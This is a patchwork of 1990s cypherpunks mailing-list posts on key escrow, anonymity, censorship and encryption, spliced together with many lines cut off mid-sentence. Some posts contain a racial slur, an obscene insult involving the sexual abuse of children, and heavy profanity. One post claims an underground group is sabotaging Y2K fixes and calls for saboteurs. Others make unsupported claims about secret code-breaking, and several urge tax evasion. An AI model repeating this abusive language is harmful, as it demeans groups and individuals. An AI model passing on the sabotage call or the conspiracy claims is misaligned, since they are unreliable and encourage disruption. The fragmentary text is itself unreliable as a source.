the remailer (and the evidence) disappears.  Your computer just deletes the
files and you never know about Joe or his anonymous message service.
Pretty good anonymity. :-)
Of course, in order to prevent certain obvious harassment attacks, the
virtual network would need to remain self-contained, so people would need
their own virtual-network/virtual-computer clients to access their
anonymous mail.  They'd probably even need to sell their cpu-cycles to key
crackers in order to pay for their email service. ;-)

It seems that Mr. Shea is still a bit wet behind the ears when it comes to understanding how the world really works.  Listen up, Joe.  You might learn something here:
As TruthMonger correctly points out, no terrorist is going to use an escrowed key to encrypt info about his activities.  At least not as his only source of encryption.  He may first encrypt the message with one or more non-GAK keys and then use the GAK key for the final layer, to make the message look legit (i.e., "government approved") to anyone who may be analyzing the contents of email traffic, looking for "unapproved crypto."  Therefore, if someone is plotting to blow up San Francisco, GAK will be of no help in preventing it.
Now the LEAs are not stupid.  They realize this fact.  Then why are they so adamant about implementing GAK when it will do absolutely nothing to prevent the very things (i.e., terrorism, child porn, [crime du jour]) it is supposedly meant to counter?  Because terrorism, etc. are not the reasons they are pushing for GAK.  The real reason is control: control over the You see, Joe, the LEAs have seen the future, and it has scared them shitless.  They see a world filled with ubiquitous privacy via strong encryption, privately-issued digital cash which transcends national borders and the taxman, and a digital world completely beyond their control.  The powermonger's worst nightmare is to lose his power.  He will do anything he can to maintain it.  If GAK is slowly, but surely implemented over the next few years, maybe, just maybe, the powermongers will be able to maintain control.  Or at least that's what they hope.
If not, then the self-righteous moralist will lie awake at night in frustration knowing that somewhere in the world, someone is getting off to a .jpg image of child porn, even though that image was generated digitally without actually causing harm to any children.  The DC politicos will be outraged that Americans are systematically moving their money offshore (via digital cash), out of the clutches of the IRS.  The media thought police will not be able to control the flow of information around the world, thus exposing the lies that they attempt to propogate as "truth."
Now, Joe, perhaps you are the kind of person that thinks dodging the taxman is wrong?  Perhaps you think the government has the right to force its citizenry to pay for things like nuclear warheads, abortion clinics, or bribes to line the pockets of Third World banana republic dictators?  I hope you are more intelligent than that, Joe.
You see, it's all very simple, but we humans tend to complicate things needlessly.  The fundamental question is whether or not we have the right to tell others what to do.  If I was to stick my hand in your pocket, pull out your wallet, and give all your money to a beggar on the street, you'd probably have me arrested.  And you would be completely right in doing so, because I unjustly took what didn't belong to me.  But this is exactly what the government does to us every day.  They force us ("voluntary compliance") to cough up a chunk of earnings to pay for their ridiculousness.  If we don't pay, they levy our bank accounts or seize our assets, all under the guise of "law."
The point is this: nobody has the right to tell me what to do.  No single person, nor a group of politicians claiming to represent "my best interests" has the right to force me to do anything.  I have the inherent (some call it God-given) right to live my life free from oppression.  If you choose to submit yourself to the slavery of another man, that's your business.  But you do not have the right to submit me to the same.
Anyone who believes that government has certain "rights" that an individual does not have is severely flawed in their logic.  In fact, that person is simply an oppressor at heart.  If you think the government has the "right" to stick its hand in my pocket to fulfill what you perceive to be "good", then you knowingly support oppression.  If you think government has the "right" to punish others who do not agree with your subjective moral code, then you are an oppressor.
So what are you, Joe?  Are you an oppressor or not?  It's a yes or no answer.  There is no middle ground.  If you think there is middle ground, it only shows that you sympathize with the oppressors, and therefore are one of them deep down inside.
Yours Truly,
Freddy Bastiat

                                                    Council
        Thank you for sending me a most interesting article.   A
society of  individuals  and  organizations  that  would  expend  the
time and resources to use a  series  of  'digital  pseudonyms' to
avoid data linkage does not in my opinion make big brother
obsolete but  acts  on  the  assumption  that  big  brother  is  ever
present.  I  view  your  system  as  a  form  of  societal  paranoia.
        As a matter of  principle,  we  are  working  to  enact  formal
legal protections for  individual  privacy  rather  than  relying  on
technical solutions.   We want to  assume  a  society  of  law  which
respects legal limits rather than  a  society  that  will  disobey  the
law, requiring  citizens  to  depend  on  technical  solutions.  e.g.
require  a  judical  warrant  for  government  interception  of  data
communications rather than  encrypt  all  messages  on  the  assumption
that regardless of the lawt  the  government  will  abuse  its  power
and invade privacy.
        As a  matter  of  practicality,  I  do  not  think  your  system
offers much hope for privacy.    First, the trend toward universal
identifiers  is  as  much a  movement  generated  by  government  or
industry's desire to keep track of all citizens as it is by
citizens seeking simplicity and convenience in all transactions.
At best,  your  system  would  benefit  the  sophisticated  and  most
would opt for  simplicity.  The  poor  and  the  undereducated  would
never use or benefit from it.
        Finally where there's a  will, there's  a  way. If  government
wants to link data bases, it  will,  by  law, require  the  disclosure
of various individual pseudonyms used by citizens or prohibit it
for data bases which the government wants to link.  Since
corporations  make  money  by  trading  commercial  lists  with one
another, they will never adopt  the  system  or  if  it  is  adopted,
will use "fine printn  contracts  to  permit  selling  various   codes
used by their customers to other firms.
        The solution remains law, policy, and consensus about limits
on government or corporate intrusion into areas of individual
autonomy.  Technique can be used to enforce that consensus or to
override it. It cannot be used as a substitute for such
                                            Sincerely Yours,
                                             /Sig/

Hey, has anyone taken a look at this file on RSA's ftp?
It is encrypted using only the zip cypher, as far as I can tell. There is a known plaintext attack against this cypher by Biham and Kocher. There are files compressed and encrypted in the archive that are freely available online. A known plaintext attack would seem easy but the files are compressed with a version 5.0 for NT. Is the encryption algorithm in this product different (more secure) than in other versions? Is it a good idea for RSA to distribute their software like this? Would it be legal to export (intentionally or not) files while encrypted and seemingly unusable if the algorithm used to encrypt could be easily broken?

I think we've all been thru this before, with the Esther Dyson flap and
so on.  That was then, this is now.
Online anonymity was not much of a real issue ten years ago, and I doubt
most readers had formed much of an opinion on it.  On private BBSes it
was prevelant, and on academic and corporate networks it was virtually
nonexistant.  As these networks began to merge, not surprisingly people
came down on both sides of the issue, but their opinions were backed more
by convention than by the facts of the situation.
I think that as time has progessed, people have come to see the reasons
behind it.  Five years ago, there was considerable debate over whether
anon.penet.fi should exist, today almost everyone takes for granted the
right to post anonymously.  For all the animosity he has caused, Spamford
Wallace has shown us why you don't want people to know your email address.
Some of you may remember the comments made on the list by a certain law
professor, who said he wouldn't post to usenet because he didn't want to
get junk mail.  In hindsight we can laugh at that remark in light of the
obvious solution.

@_subject: IRS sending warning notes, violating ECPA? 
I spoke to the judge in the case and he has agreed that your
"dressing down" of Jim is a far more severe sentence than anything
he could impose, so he is turning Jim loose this afternoon.
  Seriously...
  Your comments reminded me why I read the PRZ's PGP manual/intro
every now and again to refresh my memory/paranoia about security
  Perhaps the hardest part of maintaining secure communications and
personal privacy is remembering that, no matter how tight you run your
own ship, you are, to a certain extent, "married" to the people with
whom you communicate. And, to use an AIDS analogy, you are also
"married" to everyone they have slept with.
  Perhaps you would trust "mom" with your life. However, what if the
ever-present "they" threatened to kill all of her other children unless she ratted you out? The answer to this question doesn't matter
if you have used cryptography and/or anonymity in a manner that doesn't
leave you vulnerable to anyone else.
  Even if mom would never 'rat you out' under any circumstances, does
she have the knowledge and discipline needed to keep "them" from being
able to access your communications with her?
  The bottom line is that one should "err" on the side of safety. Being
_too_ paranoid is less costly than not being paranoid enough.
  Tim May's rants are not done in ignorance. He understands the legal
differences between saying "The criminals in D.C. _should_ be nuked.",
and saying, "I _am_going_to_ nuke the criminals in D.C., someday."
(Friday, at 4 o'clock.)
  I am certain that Tim is well aware that, even if he is right about
his statements being Constitutionally protected free speech, there is always the chance that he could suffer grief or imprisonment for them(
quite simply because "the criminals" are getting more profecient at
subverting and destroying the rights protected by the Constitution).
  I am just as certain that Tim has made a conscious decision as to
what level of risk he is willing to take to speak his mind and perhaps
make a difference in the events of his time, without merely being
egoistical, stupid, and suicidal.
  Kent Crispin, when he's not being just plain ignorant, sometimes
manages to raise valid issues that serve as a counter-point to Tim's
views, but the bottom line is that, in the presence of two other
world-leaders who are privy to the mountains of information that is
kept hidden from the public by their governments, Jean Chretien,
the Prime Minister of Canada, openly stated that the politicians
in the U.S. would be imprisoned as criminals in most countries.
  It's true. Currently, Saskatchewan politicians are being
prosecuted for what would be considered "nickle and dime" matters
in the U.S. (e.g. <$1,000 wrongful use of expense accounts). In the
U.S., the S&L scandal involved _billions_ of dollars in fraud and
thievery and only a few of the really stupid bit-players got thrown
to the wolves.
  In short, when you communicate with anyone, it is your own
responsibility to limit the level of your future vulnerability.
If you think that it's OK to post a message to the list saying,
"I'm going to nuke D.C. on Friday, at 4 p.m. Shhh! Don't tell
anybody.", then go for it. (But keep in mind that some people
just can't keep a secret.)

Well, I see on the news that the British Government are installing cameras
with OCR capabilities throughout London so that they can track all the
cars which pass by. Of course this is only to track 'terrorists and car
thieves', not ordinary law-abiding citizens, no, no, no, not at all, guvnor,
so that's all right. And don't worry about all those reports that the British
Police Force is full of corrupt officers who the superiors can't fire.
  I wonder why no-one in the media has pointed out that terrorists and car
thieves, being, after all, criminals, will have no qualms about strapping
on false plates. Oh, but I guess it will catch 'stupid' terrorists and
criminals, so that's all right after all.
  Odd that this was announced the same day as other annoucements of the British Government joining an EU-wide system to track millions of European
subversives (including, apparently, those who have been to rock concerts?). I bet it's just one of them coincidences...

@_subject: Pentium Microcode Encryption (was Re: Another vulnerability) 
The processor doesn't actually burn in the patch to on on-board EPROM,
does it?  (If it did, then the BIOS wouldn't need to load it on boot-up.)
So you can't actually wipe out microcode in the CPU.
I can't imagine them wasting precious die space to implement a multiple
round, fully cryptanalysis-proof encryption scheme, especially
considering that the microcode-update curcuitry takes up quite a bit of
space already.  It seems more likely that they would use a combination
of a few logic gates and some permutations, which wouldn't take up much
space.  (Unless, of course, they implemented the microcode-updater as
microcode software itself, which would be a really stupid thing to do -
How could the program run while overwriting itself?)
Furthermore, they mentioned "there are two levels of encryption in the
processor"  That is really bad design from a cryptanalysis point of view.
Once the outer layer has been stripped off and you find a valid header,
you can then attack the next layer by itself.  (assume a valid header
decryption could be determined by it having a low entropy in the
data-compression sense.)
That leaves the checksum question.  CRC is widely used, so they probably
had a crc design on file and could have just stuck it in.  But there is
no other use for crc calculation in the cpu, and an arithmetic checksum,
or ever XOR would be simpler.  Hmm...  (Of course you could always try to
do it like Matt Blaze did with clipper. :)
That sounds like it could be very useful.  A context-switch on a pentium
takes over a hundred clock cycles while the processor dumps all its
registers.  The problem is that on a modern 32-bit OS many of those
registers, such as the 16-bit segment registers, are not used.  If you
could change the microcode so that it would temporarily ignore those
registers it would give you faster task-switching and better performance.
I think a lot of Linux users would be interested in something like that.
Anyone know where I could find some of these 2048-byte update blocks?
It might be interesting to run some statistical analysis on it... :)

  I once built a bar in Austin, Texas, named "Crazy Bob's Saloon."
I put a diving board on top of the 1 1/2 story building and put an
old bathtub on the sidewalk below, which I filled with water.
  All week long we advertised that at noon, on Grand Opening Day,
Crazy Bob was going to jump off the diving board, and into the
bathtub full of water. During our Grand Opening, 12 noon rolled
around and Crazy Bob walked outside, with everyone following him.
  Crazy Bob looked up at the diving board, then looked down at the
bathtub full of water. He looked back up at the diving board, once
again, and back down at the bathtub full of water. Then he turned
to the crowd, and said, "Folks, they call me _Crazy_ Bob, not
_Stupid_ Bob!" Then we all went back inside and partied down.
  At the end of the night, when everybody had gone home, Crazy Bob
and I took a bottle of whiskey up to the rooftop, had some drinks
and discussed the fact that, as a man of honour, he was obligated
to make the dive, despite the fact that the "sheeple" were more
than satisfied by having an entertaining story to go home and tell
their friends.
  Did he make the dive?
  It's nobody's business but his own. I was there, and at the right
time, in the right place, with the right amount of liquor in me and
a full moon egging me on, I just might tell you. But, regardless, it
would still really be nobody's business except for Crazy Bob's.
  Perhaps Tim May is the _real_ OKC bomber, or perhaps he is the
cowardly lion. (cringing when "Toto" barks :>)
  Whether Tim "walks his talk" or not is not my business, nor is it
Kent's, or anyone else's business. One's public words may reflect
their personal anthem, their own flag/values/beliefs, or their words
may be merely the braying of mules. What matters is the value, or lack
thereof, that we may personally glean from those words, to our own
edification or detriment.
  However, the "rack" is not a "bicycle built for two." When we are
put on the rack, to test the strength of our beliefs, then the pain,
the certainty or doubt, the salvation or degredation, are all our own.
  I enjoy the outrageously strong opinions which do battle on the
CypherPunks list, and I even have a mail folder titled, "CyberPissing,"
in which I save the posts which contain classic cheap-shots.
  I respect those who stand up for what they believe in and are not
hesitant about attacking the faults they find in the logic or beliefs
of others on the list. I consider it a "public service" when others
take a shot that points out my errors/hypocrisy/stupidity, etc. It
gives me the opportunity to say, "They are right. I should adjust my
belief/attitude.", or say, "They are right, but so the fuck what? It
is my personal predeliction to be an asshole about this, and it suits
me just fine."
  It is my personal view, however, that the line between difference of
outlook/opinion and spurious, personal slander is crossed when one
stoops to denigrate the character of another list member by accusing
them of what might be "conscious evils" such as comfortable cowardice,
willful hypocrisy, or determined stupidity.
  Perhaps I will break down on the "rack" and deny all of my strongly
held beliefs, but please don't accuse me of being a boastful coward
who only holds to my beliefs when it is "safe" to do so.
  I may hold views which fail to remain consistent when measured
against standards that reflect the knowledge and experience of others,
but please don't accuse me of willfully attempting to espouse my views
only to my benefit and at the expense of others.
  Sometimes I'm a fucking idiot and probably ought to be taken out
and shot, but I strive to come by my stupidity "honestly," and not to
use stupidity as an "excuse" to do evil.
  Tim May is a grouchy old CypherPunk with an itchy trigger finger and
Kent Crispin has suffered the misfortune of having the the government

and the decision as to which of them would make the world a better

  The government is grandstanding their ploy to promote an increasing
level of censorship (and eventually "criminalize" non-compliance with
what they now portray as "voluntary" ratings) *DESPITE* the fact that
there are already tools available to meet the needs the government
claims to be addressing.
  If city kids drive their cars out into the country to watch the
farmer's wife undressing through the bedroom window, will the government
pass laws criminalizing country residents building houses which
have windows? God forbid that the Founding Fathers might have their
words twisted by villainous Cypherpunks to suggest that they would
expect parents to take responsibility for their children's upbringing
and activities.
  I'm getting sick and fucking tired of the government restricting
and/or violating my rights, liberty, freedom and pursuit of happiness
in order to enable the sheeple to have the illusion of righteousness
and security despite their laziness/unwillingness/stupidity which
is used as a rationale to pretend that products and tools which are
easily within their reach are not sufficient to meet their needs.
  What, exactly, is the problem?
  Are these censorous motherfuckers of the opinion that protecting
their children from these loudly proclaimed moral threats is not
worth spending thirty or forty bucks on?
  Are they saying that your and my rights and freedoms are worth
less than the thirty or forty bucks it would take for them to
purchase censoring software?
  Bottom Line: If you or I personally developed, and distributed freely,
a product which would guarantee that no child would ever be exposed to
any material that their parents did not approve of, these stinking,
conniving bastards would still be pressing for censorous legislation because they feel that it is their right to force their narrow, fascist,
moralistic standards on everybody.
  A Challenge To Declan: Do you have the balls to contact all of those
individuals pushing for fascist censorship in the name of "protecting
children" and ask them if they would support the rights of adults to
promote and access adult material on the InterNet if a way can be found
to guarantee that minors will not be able to access it?
  Do you have the balls to refuse letting them dodge the issue with
meaningless, bullshit, political rhetoric? Do you have the balls to
tell them that if you don't get a straight answer,  you will report that they are lying, fascist, censorist motherfuckers who are hiding
behind children to disguise their hidden agenda of forcing their personal beliefs on others?
  Oops! I seem to be redundating the "other" Billy G's points and
Could it possibly be that the true/hidden agenda and fascist, slimeball
tactics of the CR's (Censorous Ratfuckers) are so blatantly obvious that anyone on the list could have easily written this post, as well as the "other" Billy G's post?
  Could it possibly be that this is an "open secret" that the sheeple are pretending they do not know because they have been brainwashed into
accepting the guilt/blame placed on them by the self-proclaimed
"righteous" who feel that they are superior to those with different
values and beliefs, and thus are entitled to force others, at gunpoint,
to live according to their own narrow constraints of acceptable beliefs
and behavior?
  Could it possibly be that I am not, in fact, the brilliant genius that
I conceive myself to be, in seeing through the fascist righteousness
which the Censorous Ratfuckers use as a tool to justify forcing their
values and beliefs on others? Is it possible that even the sheeple understand the injustice that is being forced upon them at gunpoint,
but have the wit and wisdom to complacently comply, in order to survive
long enough to live lives of quiet desperation?
  Could it possibly be that Jesus and Jim Bell are not isolated examples
of society and government breaking down, but are actually examples of
the way the "real world" works?
  Perhaps I need to spend $200,000.00 getting elected to a $20,000.00
a year position on the Water Board in Austin, Texas, and become a
millionaire within a year's time.
  Perhaps I need to become a TV preacher and make millions by putting
pictures of starving children on TV, in order to be able to pay for
the hookers and cheap motel rooms that go with the territory.
  Perhaps I need to run for Congress so that I can pay myself around $300,000.00 for *not* growing cotton, guarantee that my neighbor's
tax money will pay me an inflated price for my milk and cheese, and
put shoes on my kids by making my home state a dumping ground for nuclear waste.
  Perhaps I should run for President, become the leader of our country,
and lie about...well...about *everything*, I guess.   Could it possibly be that I am helping to destroy America by failing
to support forced compliance with "Family Values?"
  Should my bid for the Presidency be centered around a theme of a "return" to God-fearing decency and Christian values?

@_subject: CanadaBanAna Censors US TV (and bans decryption) 
Saturday, July 26, 1997
   By Terence Corcoran
   HOME Box Office, the U.S. cable network, just garnered 90 Emmy
   nominations in recognition of quality programming. But HBO is still
   banned in Canada. The network was not on the list of foreign services
   approved Wednesday by Canada's dictator of cable and satellite
   television content, the CRTC. Others banned by the CRTC include
   Bloomberg Television and the U.S. versions of the Discovery Channel,
   The Comedy Network, the Disney Channel and scores of other program
   services deemed too subversive for Canadians to watch in their
   original form -- unless, of course, the same programming passes
   through the hands of a Canadian middleman or monopolist who will
   culturally sanitize the programming by skimming off a fat profit.
   Once a Canadian has grabbed a piece of the action -- as a distributor,
   broadcast licence holder, cable operator or satellite owner --
   Canadians are allowed to view the U.S. content. This banana republic
   setup has been in place for decades, and now it may be getting worse.
   A judge has concluded in one of the satellite disputes that it may
   even be illegal for a Canadian to pay for HBO and other networks as
   they come in over the border on U.S. satellite systems.
   The oral judgment by Mr. Justice Frederick Gibson of Federal Court of
   Canada in the case of ExpressVu versus Norsat and other companies was
   issued last month, but the written version sets a number of bizarre
   precedents that appear to deeply infringe on individual rights. By
   ruling in favour of ExpressVu, the Canadian satellite company, Judge
   Gibson has essentially come up with a judgment that is the equivalent
   of making it illegal for a Canadian to subscribe to Fortune or
   Cosmopolitan magazines or to buy a copy of Vanity Fair or Esquire on
   the newsstand.
   In this judgment, it is illegal for a Canadian to watch HBO and scores
   of other channels now available in the United States -- even if the
   service is paid for -- on the grounds that the federal
   Radiocommunication Act makes it illegal. The act says no person shall
   decode an encrypted signal without paying for the service and without
   authorization of the person who has the lawful right in Canada to
   transmit the signal.
   The purpose of the act's clauses on encryption is a technical one to
   prevent fraud. Evidence presented by Andrew Roman, the lawyer for
   Norsat, makes it clear that the intent of the government was to make
   it illegal for people to use counterfeit decoders and other devices to
   avoid payment. All the debates in Commons committee focus on the act
   as an attempt to prevent theft of signals. No such theft occurs when
   Canadians subscribe to and pay for a U.S. satellite service.
   But Judge Gibson's judgment ignores the theft-of-signal intent of the
   legislation. Instead, he interprets the act, in conjunction with other
   laws, and concludes that the clause on encryption makes it illegal for
   anyone to subscribe to a U.S. satellite service. Norsat has filed an
   appeal.
   What makes this judgment even more unusual is that it effectively
   attempts to make it illegal for a Canadian to pay for a U.S. channel
   on a U.S. satellite, when the identical U.S. channel is available on
   Canadian cable or satellite. For example, WGN-TV in Chicago can be
   picked up on Canadian cable, Canadian satellite or on U.S. satellite.
   In each case, the subscriber pays for the service. But under this
   judgment, it would be illegal to pay the U.S. satellite for WGN-TV.
   Who does this serve -- other than giving Bell and the cable companies
   more revenue.
   Even stranger is that many of the networks carried by U.S. satellites
   are already available in Canada over the air waves free, or on cable,
   or on C-band, an alternative satellite service that has been available
   in Canada for years. A Seinfeld episode can be picked up free over the
   air from a U.S. television station, or on a U.S. station via cable, or
   on a Canadian station on cable. But if the same Seinfeld episode were
   bought by a Canadian from a U.S. satellite service, it's illegal.
   Filling the troughs of the Canadian broadcasting industry and
   transmission systems may be the purpose of broadcasting policy, but it
   is certainly not the objective of this section of the
   Radiocommunication Act.
   Canada's specialty networks, meanwhile, are gearing up to flood the
   country with copy-cat versions of the networks banned by the CRTC --
   including The Globe and Mail, which is a partner in ROBTv, a business
   channel that hopes to benefit from the fact that Bloomberg will be
   banned in Canada. Other brilliantly innovative duplications of U.S.
   networks are The Home and Garden Channel, History Television, The
   Comedy Network, Discovery and Country. Is this unique Canadian
   culture? One such Canadian offering, The Family Channel, has even
   abandoned all pretext to being a Canadian original: it's changing its
   name to recognize the source of most of its content: The Disney
   Channel.

@_subject: Can you spell 'Stoopid'? Sure you can... / Re: thought for the day, and my IRS Investigations report 
Dear Dave,
  Why does it always seem that it is the idiots who ask this question?
  Are you by any chance of fate related to the David Downey who spammed
the cypherpunks list with an announcement of his attempt to "get a
of the other cypherpunk lists together under one umbrella," then sent
several copies of his "Welcome to my fascist, censorous,
mailing list." message to the cypherpunks list (and subsequently
his lack of knowledge as to how to unsubscribe to a mailing list, let alone try to run one)?
Welcome to The Privacy Channel's Cryptography-Politics-PGP-L. As you've
probably guessed from the list title, this list is dedicated to the
open, friendly, and intellegent discussion of Cryptography around the
  "Open, friendly, and intellegent discussion." ???!!!???
  Sounds like my "CypherPissing" mail folder would starve to death
if it counted on your list for its sustenance.
All are welcome here
  Thank God! I was afraid I wouldn't be able to discuss my pictures
of the Pope with his dick in the mouth of children being held down
by Mother Teresa.
Now, let's get a few things out of the way. The Rules!
  I'm starting to smell leather. Is it 'Jackboot' leather?
1) ABSOLUTELY NO SPAMMING ALLOWED!!!! I'll can ya in a heartbeat, as
well as speak to all the server owners that you traveled on.
  Are the capital letters meant to indicate shouting, a thick Nazi German accent, or both? And are you intending only to 'inform' on
and 'cause trouble for' *bad* people? Will there be 'spankings' involved (or does this cost extra)?
2) You keep it kind of clean. Keep the swearing and such down to a
minimum.   Ex-fucking-cuse me?
  Is there a swearing 'minimum' which is *required*, or only a 'maximum'
which is *allowed*? Do Tourettics require a note from their doctor to
call someone who sucks dick a cocksucker?
You can get your point across just as well without cussing.
  Right. Like there is a phrase other than "lying, fucking criminal,
god damn, rat-bastard Nazi motherfuckers" that could possibly come
close to describing our beloved legislators.
Flaming others is also considered bad karma here. I'd like to see folks
help each other around here.   "Why can't we all just get..."
  "... along."
        - Rodney King
  "...a long nightstick and just beat the fuck out of a nigger."
        - L.A. Chief of Police
After all, we are all we got!
  And "Wherever you go, there you are."
  And "Patience comes to those who wait."
  And "If God is Love and Love is Blind, then Ray Charles must be God."
  Will we be singing "Michael row the boat ashore." a lot on your list?
3) You try to keep as much as possible to the point, and to the content
of this list.
  OK, but it's going to make it a lot harder to sell my '67 Chevy
wagon. (It's an "anonymous" automobile with stolen plates. Perfect for
a cypherpunk.)
If you really want to talk about something else, let me
know. I'll get another list going.
  Great! Now I know who is in charge of giving me permission to talk and
is willing to control the forum in which I do it. Up until now I have
had to bear this terrible burden myself.
4) Respect others!!!
  Does the "!!!" imply "or else..."?
5) Finally, HAVE FUN!!!!!
  How? By telling you to stick your "rules" up your ass?
  "FUN" in a manner that meets your approval?
  Does your shouting "HAVE FUN" and the multiple exclamation marks
mean that having fun is 'required'?
  If so, will Jim Bell be allowed an exception to this rule, or will
he have to learn to enjoy being buggered by Prisoner I'm done. Talk to you on the List.
  You were done before you even got started. And shouldn't you have
said, "SHOUT AT YOU ON THE LIST!!!!!!!!!!!!!!!!!!!!!!!!!!!"?
  I think I'll join the "Miss Manners Cryptography List," instead.
It teaches proper oppression etiquitte, such as which fork to stick
in the eye of the Jackboots who kick in your door to demand your
secret key, and how to choose the proper wine to go with the shit that the government dishes out.

That's not voulntary, as Tim stated.
Unless you believe that voluntary ratings in order to get listed in a search engine are wrong.
Some pre-teens are smarter than that, and may thwart the system.  Whose fault it it then if they see a page with porn on it?
Therefore, don't use yahoo.  Use one that doesn't promote censorship.
And I won't be shocked when the Supreme court strikes that down.  The problem can be solved, just let parents monitor their kids access.  If that happened, there would be no need for this censorware and rating crap.
Well, if they have that privacy, they often go to a site with images that some people consider obscene.  That's when the parents, unable to accept their mistake for not being responsible, blame the webpage's author.
Those parents probably are lazy in the first place.
You seem to favor the "Let's just do this to avoid hassle" thing that law enforcement and government types try to promote.  If we were to, "avoid the hassle" with webpage ratings, we might as well "avoid the hassle" of using PGP and such so that we don't anger the government anymore.

@_subject: Cryptography Question (I hope it's not off-topic on this list) 
I was thinking about *chaining* remailers and wondered if encryption
of a certain strength could be *chained* in order to make it as strong
as stronger encryption.
  e.g. - If only 56-bit encryption becomes legal, is there a method
of *chaining* several passes of 48-bit encryption which would make it
just as hard to break as 96/192/384-bit (etc.) encryption?
  If this is indeed impossible, then perhaps the government might pass
a law that makes it illegal to encrypt an encrypted file, but experience
seems to suggest that any law passed always leaves a loophole or back
door for inventive people to circumvent it.

I find it interesting that the cynical/sinister/paranoid cypherpunk

future trends of events on the Internet, particularly in areas which
surround very major and very minor issues. The Tim May's and Declan
McCullagh's shed interesting light on the future course of major events
while the Monger's and Dog Boy's turn their precognitive abilities in
the direction of the more mundane aspects of the Internet as a
of humanity/society.
  The "Spare DigiCa$h" post gave me pause to reflect how long it will be
before technology is sufficiently developed that when we hit our key, "CyberBums" will approach and offer to clean our video monitor with
an oily rag. Will we be cursed for offering CyberBums a form of e$pare-

which prevent CyberBums from approaching us for e$pare-change within two
relay hops of an eCa$h site? Will CyberBums sort through our killfile
dumpsters for eTra$h?

off the Internet and away from computers?   Will the future bring laws which permit restraining orders against
individuals accessing certain parts of the Internet? Sex offenders/sex
sites; burglars/financial sites; pedophiles/children's sites?
  It seems to me that increasing regulations and laws surrounding the
access and use of the Internet will require strict laws requiring the
user to be able to show verification of identity/age/criminal history/
financial history/(approved government) reputation capital, and all
manner of information to place us all in categories needed to monitor
our compliance with laws and regulations.
  Once browsers are required by law to support a certain rating system
and children manage to get around it, there will no doubt be laws
passed requiring fascist monitoring of who is actually using the
software.(And LEA's who demand that phone companies provide them with
the ability to trace/locate cellular phone users will undoubtably want
the same capabilities with Internet users, in a war against anonymity.)
  There will be no shortage of James Love's, Kent Crispin's and Hallam-

This above is true when analyzed within the boundaries of current
cryptographical theory, but has about as much meaning as would the
discounting of Einstein's work by an old-school physicist.
  There was a rather bizarre post to the list a few months ago which
layed out a conceptual schematic of new research being done in the
area of encryption. Although the post was bizarre, the information
it provided was not. As a matter of fact, it seemed to be wider in
scope and more advanced in its application than the level currently
achieved by NSA and related covert government organizations.
  {And although the 33 minutes quote may lean toward bragging, it
is not off by much.}
  Research currently being done in the encryption field by those who
do *not* tell contains a smattering of new mathematical theory and
a significant quantity of analysis which is a close cousin to traffic
analysis. The result is that a person using _all_ of the security
and encryption capabilities of a strong crypto product is likely to
have secure communications, but if they neglect to perform even one
of the _minor_ security steps possible, then there is a crack in
their communication which can be expanded to a size large enough
to drive a tank through.
  LEA's are not battling to squelch the use of crypto that they
cannot readily break--they are battling to slow the growth of
strong encryption in order to maintain their current ability to
break encryption which is commonly thought to be secure.

blind arrogance

somehow excuses or justifies diminishing privacy rights for everyone
else.   There must be some kind of ratio: 1,000,000 rights diminished for  1

uncommon in new (and some of the older) list members.
  As a matter of fact, I don't believe I've seen a post by any of the

major reasons for the erosion of our civil rights is usurpment of
them by civil servants. In effect, the "servants" have armed themself
and taken over control of the manor from its owners--their "masters."
  "Legitimate needs" seem to have usurped "legitimate rights."
  All of a sudden, we are required, at gunpoint, to eat our meals only
at times which conveniently fit into the "servant's" schedule. Next,
we find out that the servants "don't do windows." Then we find out
that the servants need to sleep in the "big bedroom" because they
work so much harder than us, and that we have to sleep in the barn
because they need the servant's quarters for other "legitimate needs."
  The "tail" of government is wagging the "Bull Mastiff" of our
Constitutional rights and freedoms.
  Please continue to follow the cypherpunks list, as there is a decided
shortage of individuals left in society who are capable and willing to
understand the importance of true privacy, rights and freedom. There is
no disgrace in having been round-up and penned with the rest of the

There is an underground computer organization in place which is
actively working toward sabotaging government and corporate efforts
to resolve the Year 2000 problems. They began coordinating their
efforts in 1990, almost a decade before the powers-that-be will
finally get around to recognizing the need to definitively move
on the matter in a major way.
  In essence, the goals of the organization have been to promote
the most unwieldy, unworkable and inefficient solutions possible
to the Year 2000 programming problems which exist on various
platforms. It was forseen that the problem would be a weak point
in the New Electronic World Order that could be effectively used
to inject chaos and diversion into the plans of the secret world
governments to turn the Internet into a tool of government and
corporate fascism.
  The end goal is to be able to manage a breakdown of the current
world-power structure in a manner that will allow society to be
able to survive and continue, while shifting the source of power
and control to the innovative individuals and organizations who
are able to adapt and evolve in the InterActive Electronic Age
of Communication.
  The problems of creeping fascism are closely related to the
problems that result from statism. Even anarchist recognize the
need for social order and contracts, but not at gunpoint--not
in a static system which results in the rich getting richer and
the strong getting stronger.
  A controlled breadown of existing systems will prevent the
stifling of our freedom to grow and evolve by those whose interests
lie in crushing innovation and evolutionary progress. It will give
those who have the capacity to adapt and survive an edge in the
development of the evolving Age of Information.
  We are on the threshold of the dawning of a New Age which will
be every bit as world-changing as the Industrial Revolution. It is
up to each of us, as individuals, to choose whether we will attempt
to cling blindly to the past or stride boldly into the future.
  The criminals who are currently in power are a danger to our lives
and our freedom. Their interest lies in maintaining the currently
prevailing power structures, and in stifling and oppressing those
ideas and individuals who threaten their hold on the reigns of
  There is a need for spies and saboteurs who are capable of working
on their own, or in small cells, to disrupt the attempts of the

censor, to control and manipulate world markets and currencies,
to monitor all activities and communications and suppress those
who would think or act in ways which are contrary to the goals
of the New Electronic World Order.
  The "Digital Revolution" began almost a decade ago, regardless of
when "Wired" copyrighted the phrase.
  Feel free to join the revolution and do your part to change the
course of history. Government and Corporate fascism is much like
configurable software--it "defaults" to certain settings, but the
more individuals who customize it to meet their own needs, then
the more those who produce that software will have to strive to
meet the legitimate needs of the *users* in order to retain their
votes/market-share, instead of requiring the users to bend to
meet the "legitimate" needs of the Fa$cists and Ca$h Cow$.

Strange. I followed some of the links on the Sewer site, and all
I found was that they were harassing and slandering people with
perfectly legitimate reasons for having normal pictures of clothed
children on their site.
  Are child actors supposed to put pictures of adults who look
similar to them on their web sites? Are pictures of themself (fully clothed) "pornography" when gay teens put them on a web
site, but pictures of themself that Christian teens put of
themself on s web site are "wholesome?"
  No doubt some of those soldiers had naked pictures of their
children in their wallets, but I doubt if those pictures gave
them a hard-on, as they would obviously do for Officer Paladino.
  Officer Paladino seems to fail to understand that "his" hard-on
does not make "other" people perverts.
  Intelligence and educations are not requirements to become a
member of the Righteous Right. Neither are tolerance and respect
for the personal moral beliefs of others.
  It will be interesting to see whose "moral values" prevail on
the InterNet when the laws and traditions of various societies and
